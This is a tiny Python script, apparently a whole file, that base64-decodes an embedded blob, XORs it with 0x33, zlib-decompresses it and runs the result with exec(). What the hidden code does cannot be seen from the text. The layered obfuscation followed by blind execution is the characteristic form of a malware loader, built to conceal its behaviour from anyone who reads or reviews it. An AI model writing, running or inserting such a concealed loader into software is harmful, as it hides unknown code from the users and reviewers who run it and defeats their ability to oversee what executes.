import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'S68evQI98QM/dsSv0VxeEzAxghMJQTYl9yMaPYZnFvt6cu+tB/rs38zHX3QtZfu9bEVKBau6bEDlJLYhxZtYbxQvI5aERl/3JYKvO0SIn0cgugE93KsLwLQj8MEoRxa2wRmSyEXul2e96h0bDda4DIIQQ/PQW0MBCwzopjXelMXaNaq5WcY0jP8KBw=='
exec(zlib.decompress(bytes(b ^ 0x33 for b in base64.b64decode(_p))))
